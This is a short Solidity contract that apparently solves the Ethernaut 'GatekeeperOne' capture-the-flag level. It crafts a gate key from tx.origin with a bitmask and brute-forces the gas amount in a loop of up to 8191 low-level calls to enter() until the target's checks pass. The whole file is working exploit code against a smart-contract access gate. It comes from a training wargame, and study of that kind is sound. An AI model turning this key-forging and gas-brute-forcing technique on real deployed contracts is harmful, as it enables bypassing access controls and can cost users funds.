// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackGateKeeperOne {
    IGateKeeperOne gateKeeperOne;
    bytes8 key;

    constructor(address _gateKeeperOne) {
        gateKeeperOne = IGateKeeperOne(_gateKeeperOne);
    }

    function hack() public{
        key = bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;
        for(uint i=0; i<8191; i++) {
            (bool success, ) = address(gateKeeperOne).call{gas:1000000+i}(abi.encodeWithSignature("enter(bytes8)", key));
            //gateKeeperOne.enter{gas:1000000+i}(key); // Can't do abi call, reverts entire transaction when fails.
            if (success) {
                break;
            }
        }
    }
}

interface IGateKeeperOne {
  function enter(bytes8 _gateKey) external returns (bool);
}